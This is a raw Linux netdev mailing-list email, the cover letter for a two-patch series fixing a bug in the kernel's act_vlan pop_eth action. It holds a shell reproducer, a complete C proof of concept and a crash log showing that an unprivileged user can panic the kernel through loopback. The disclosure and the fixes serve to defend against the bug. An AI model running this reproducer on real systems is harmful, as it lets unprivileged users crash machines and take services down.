Received: from mail-pj1-f51.google.com (mail-pj1-f51.google.com [209.85.216.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 19920397691
	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:55:00 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.51
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784829303; cv=none; b=emQNzkzVjUXRQf1XiezSSsN2K03PJ+rR3zssraK/JDkgPC+juBvfIzBJrSkMVHxZLMN8Un7Jqz3k0Rb/hjwZ0MIbftP/kxotwRnvrKzJZqpgB2eq/gwZi8EXRKGe7+TPTzUdgt2berPk6+3THXJCZ5nAjRIxWFrMAJUev09YGgY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784829303; c=relaxed/simple;
	bh=f/tbKbAM4yDX230q7PCUeeY5wXtDieHeLaAdbixrYxI=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kIuFoKBkDodrjfhFtg++HDb7ZrHS1e+tanJAqM2TlO+lVdp4oI8sg8BSS1NHDUMrPDSCHd+aV14Cx5+Ii9PFhYwKJUnuR3bNQct/I5q0v1WjC016kJ/LCRpFA1cAUC81zkTFzsWoNJpEjCFFV5/iGZXqoI9MauTSvtkStnxAN3g=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=FdCifN3q; arc=none smtp.client-ip=209.85.216.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="FdCifN3q"
Received: by mail-pj1-f51.google.com with SMTP id 98e67ed59e1d1-38dc4553f62so1002438a91.0
        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:55:00 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784829299; x=1785434099; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=+2NlHFRpS6kgtmx1AoEINdeSGFQVkdLZGJGAyvcdzdU=;
        b=FdCifN3qzDw8QqGdjffOHDINpoCWySPj4nwXwUqFB7JtYb0UhXODb9vCzanhB3YERN
         lgncAv9KOl1jq+xTX2G6ABLrev04jvaPujUpj8z9lPOS446sdW9Wiv9o7dGkr/hH+MQP
         JkldkL3LtEcHDtP4uNzxDdxBvaq+4W/T/oPXv7rYiXKIcZiJcYmn966V7FB9OFANUPpQ
         nwx5G7xa23lRRshG+lPqmfISMc+46vR9QT05ea+IPJjdXNOEBNkUYMfa0VvdIYRxYFw7
         I+xGe/qoXcDZKvIvltTKiM//2LM+965+3/iIfo5S0rJXqeHvtwM1mGHHHJA7Q1+r1mch
         MBag==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784829299; x=1785434099;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=+2NlHFRpS6kgtmx1AoEINdeSGFQVkdLZGJGAyvcdzdU=;
        b=UYXbICzng0iSLsJmTDqadsN1t6Jv0XDv8Q4wuYjnwhr9mjwYTjlCqkwp49DJWY+iM5
         x+8k4MPoH0hxKc3sOdimG+m2a2XMPjPZW8IxYDndopCjkx2fj2/YKWSLz3PXwiEpwMYs
         1qJRqHOnDiir2lnm3OFukULd2moWAD1x8oF3xqsOMzh1hNcJsjBr+sTL17tm9DcN03Sj
         drZWCGr3o+wdRN8kZstl7qAhIeu/d7iJJwdTX45EanmHQtZ9d+t2/4FqKusvOZSU8WHb
         gDQAHXl64dEMrFdP2klzgBLMFzy161u6L0M4ZLCb0vmhFSxzl4NcguZ/wbOTSrxdXdI5
         oitA==
X-Gm-Message-State: AOJu0Yy/gkZB1El80KuVgRLjrayBm9UzOEivPmncskV8NqT/2bx+vEoC
	RBknmIXH5Fwrb14TNL12SRQtWSsSvtfJKbectiAAPK0DtX6rVktWTEZpy1Acy84m/9E=
X-Gm-Gg: AR+sD11oKwd3TReaeqf5lKrUGfGM2sYoPSJeaR5xHoMIxFqaS/V6a+RWhFsFxchA+HY
	VuR983ak60A+9K9tmGpd4bcH6FK72TqclmS3cL8eRkwZvs8k2ZvwgpUb8Bsuo33aSFFepr+yXzn
	1gkETpquZ2bHxft0yZrtTItibMWgDs1FErGH1rFyH1lJWMWupjpmm3yx+G8CdKCABYm5HQ1YL5H
	I3XF8chMKH49lXMLMoHvcc7n0DpG7qKp5lUT7WG74f81Nz30bk33J11ljjHCc29FWTDcfZRKPb/
	R1MN1yl43jCS3SqPZk9SQ3ef8WYMPBHHoozb+emaYfXfyEIsXMSiR6TXjvDIyv5K0wdyZtDEI6h
	Lpq6tTAjOCTabY3v7TPcUGRS8h3WeLBlpU7RoOSJKvt7evonJw8opMn5OYFwh7V4GD6uAhjeP8S
	bFRJW7GvAL7DyvyHXtn/wK4UVl9PlLeYd53IU0VWNR
X-Received: by 2002:a17:90b:1b01:b0:38e:57a3:f218 with SMTP id 98e67ed59e1d1-38ec64f272dmr4548909a91.13.1784829299321;
        Thu, 23 Jul 2026 10:54:59 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-13d130262d2sm15943883c88.7.2026.07.23.10.54.52
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 10:54:58 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: jhs@mojatatu.com,
	jiri@resnulli.us,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	peilin.ye@bytedance.com,
	cong.wang@bytedance.com,
	gnault@redhat.com,
	vega@nebusec.ai,
	bronzed_45_vested@icloud.com,
	enjou1224z@gmail.com
Subject: [PATCH net v2 0/2] net/sched: act_vlan: pop_eth can strip non-Ethernet skbs and panic loopback
Date: Fri, 24 Jul 2026 01:54:46 +0800
Message-ID: <cover.1784709375.git.bronzed_45_vested@icloud.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Wyatt Feng <bronzed_45_vested@icloud.com>

Hi Linux kernel maintainers,

We found an issue in net/sched/act_vlan.c.
The bug is reachable by an unprivileged user using private user and network namespaces.
The relevant details are provided below.

---- details below ----

Bug details:

The bug is in `tcf_vlan_act()` when handling `TCA_VLAN_ACT_POP_ETH`.
The action is applied without checking that the skb is on an Ethernet
device. On loopback and other non-Ethernet devices, `skb_eth_pop()`
removes `ETH_HLEN` bytes from the skb head even though the later TX path
still expects an Ethernet header.

When such a packet is transmitted through `lo`, `loopback_xmit()` calls
`eth_type_trans()`, which unconditionally pulls another `ETH_HLEN`
bytes. For a large non-linear AF_PACKET skb whose linear head contains
only the original Ethernet header, the first pull leaves
`skb_headlen(skb) == 0`. The second pull then reaches `__skb_pull()`
with `skb->len < skb->data_len` and triggers a kernel BUG, crashing the
guest.

This is a short-packet handling bug caused by applying an Ethernet-only
transform to a non-Ethernet skb.

Reproducer:

PATH=/usr/sbin:/usr/bin:/sbin:/bin gcc -O2 -Wall -x c -o mini_poc.bin mini_poc
PATH=/usr/sbin:/usr/bin:/sbin:/bin unshare -Urn sh -euxc '
ip link set lo up
trap "tc qdisc del dev lo clsact 2>/dev/null || true" EXIT
tc qdisc add dev lo clsact
tc filter add dev lo egress pref 1 protocol all flower \
  action vlan pop_eth \
  action skbmod dmac 02:11:22:33:44:55 pipe
./mini_poc.bin
'


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main(void)
{
	struct sockaddr_ll sll;
	unsigned char *frame;
	size_t len = ETH_HLEN + 8192;
	int fd;

	frame = malloc(len);
	if (!frame) {
		perror("malloc");
		return 1;
	}

	memset(frame, 'A', len);
	frame[0] = 0xaa;
	frame[1] = 0xbb;
	frame[2] = 0xcc;
	frame[3] = 0xdd;
	frame[4] = 0xee;
	frame[5] = 0xff;
	frame[6] = 0x11;
	frame[7] = 0x22;
	frame[8] = 0x33;
	frame[9] = 0x44;
	frame[10] = 0x55;
	frame[11] = 0x66;
	frame[12] = 0x08;
	frame[13] = 0x00;

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if (fd < 0) {
		perror("socket");
		return 1;
	}

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = if_nametoindex("lo");
	if (!sll.sll_ifindex) {
		perror("if_nametoindex");
		return 1;
	}

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
		perror("bind");
		return 1;
	}

	if (send(fd, frame, len, 0) < 0) {
		perror("send");
		return 1;
	}

	close(fd);
	free(frame);
	return 0;
}


------END PoC--------

----BEGIN crash log----

[  138.618799][ T9361] __skb_pull(len=14)
[  138.619387][ T9361] skb len=8192 data_len=8192 headroom=16 headlen=0 tailroom=0
[  138.619387][ T9361] end-tail=368 mac=(16,0) mac_len=0 net=(16,-1) trans=-1
[  138.619387][ T9361] shinfo(txflags=0 nr_frags=1 gso(size=0 type=0 segs=0))
[  138.625465][ T9361] dev name=lo feat=0x0000052e401d4c69
[  138.646157][ T9361] ------------[ cut here ]------------
[  138.646805][ T9361] kernel BUG at include/linux/skbuff.h:2847!
[  138.647529][ T9361] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  138.648307][ T9361] CPU: 1 UID: 1001 PID: 9361 Comm: mini_poc.bin Not tainted 7.1.0-13910-g6c00e85cd46f #1 PREEMPT(full)
[  138.650828][ T9361] RIP: 0010:eth_type_trans.cold+0x2c/0x30
[  138.662853][ T9361]  <TASK>
[  138.663655][ T9361]  loopback_xmit+0x21b/0x6e0
[  138.672320][ T9361]  packet_xmit+0x243/0x310
[  138.672878][ T9361]  packet_sendmsg+0x319a/0x5100
[  138.680374][ T9361]  __x64_sys_sendto+0xe0/0x1c0
[  138.707494][ T9361] Kernel panic - not syncing: Fatal exception in interrupt


-----END crash log-----

Best regards,
Wyatt Feng

Changes since v1:
Link: https://lore.kernel.org/r/3ab4a04fbab887238facc1792e02c33fd68190f7.1782548651.git.bronzed_45_vested@icloud.com
Link: https://lore.kernel.org/r/40fe2d7dfce13411bfbe9271c0f7c54fb7e88e3b.1782548651.git.bronzed_45_vested@icloud.com
- Kept the actual code changes unchanged from the previous version.
- Reworded both commit messages to more clearly describe the failure
  mode and the exact header-length checks.
- Consolidated the Reported-by tags to Vega <vega@nebusec.ai>.


Wyatt Feng (2):
  net/sched: act_skbmod: require a full Ethernet header for MAC rewrites
  net/sched: act_vlan: skip pop_eth on non-Ethernet devices

 net/sched/act_skbmod.c | 9 +++++++--
 net/sched/act_vlan.c   | 4 ++++
 2 files changed, 11 insertions(+), 2 deletions(-)

-- 
2.47.3
